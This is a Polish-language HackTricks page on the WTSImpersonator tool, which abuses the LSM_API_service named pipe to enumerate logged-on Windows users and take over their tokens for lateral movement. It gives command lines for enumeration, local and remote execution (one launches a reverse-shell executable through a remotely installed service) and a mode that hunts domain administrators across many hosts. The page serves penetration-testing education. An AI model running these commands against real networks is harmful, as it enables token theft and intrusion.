{{#include ../../banners/hacktricks-training.md}}

Narzędzie **WTS Impersonator** wykorzystuje **"\\pipe\LSM_API_service"** RPC Named pipe do dyskretnego enumerowania zalogowanych użytkowników i przejmowania ich tokenów, omijając tradycyjne techniki impersonacji tokenów. Takie podejście ułatwia płynne ruchy lateralne w sieciach. Innowacja stojąca za tą techniką jest przypisywana **Omriemu Baso, którego prace są dostępne na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Podstawowa funkcjonalność

Narzędzie działa poprzez sekwencję wywołań API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Kluczowe moduły i użycie

- **Enumeracja użytkowników**: Możliwa jest lokalna i zdalna enumeracja użytkowników za pomocą narzędzia, używając poleceń dla obu scenariuszy:

- Lokalnie:
```powershell
.\WTSImpersonator.exe -m enum
```
- Zdalnie, określając adres IP lub nazwę hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają kontekstu **Usługi** do działania. Lokalne wykonanie wymaga jedynie pliku wykonywalnego WTSImpersonator i polecenia:

- Przykład lokalnego wykonania polecenia:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe można użyć do uzyskania kontekstu usługi:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalne wykonywanie poleceń**: Polega na tworzeniu i instalowaniu usługi zdalnie, podobnie jak PsExec.exe, co pozwala na wykonanie z odpowiednimi uprawnieniami.

- Przykład zdalnego wykonania:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduł polowania na użytkowników**: Celuje w określonych użytkowników na wielu maszynach, wykonując kod pod ich poświadczeniami. Jest to szczególnie przydatne w celu atakowania administratorów domeny z lokalnymi prawami administratora na kilku systemach.
- Przykład użycia:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
